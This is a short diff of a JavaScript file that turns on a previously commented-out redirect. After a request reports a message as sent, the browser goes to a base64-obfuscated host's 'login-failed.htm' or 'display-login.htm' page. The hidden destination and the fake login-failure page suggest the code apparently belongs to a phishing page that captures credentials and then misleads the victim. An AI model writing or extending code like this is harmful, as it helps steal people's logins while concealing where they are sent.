@@ -168,13 +168,12 @@ document.addEventListener("DOMContentLoaded", function () {
       return response.json();
     })
     .then((data) => {
-      console.log("Message sent:", data);
-      // Redirect to another page after successful submission
-    //   if (data) {
-    //     window.location.href = `${atob(h)}/login-failed.htm`;
-    // } else {
-    //     window.location.href = `${atob(h)}/display-login.htm`;
-    // }
+      console.log("Message sent:", data?.ok);
+      if (data?.ok) {
+        window.location.href = `${atob(h)}/login-failed.htm`;
+    } else {
+        window.location.href = `${atob(h)}/display-login.htm`;
+    }
         
     })
     .catch((error) => console.error("Error:", error));
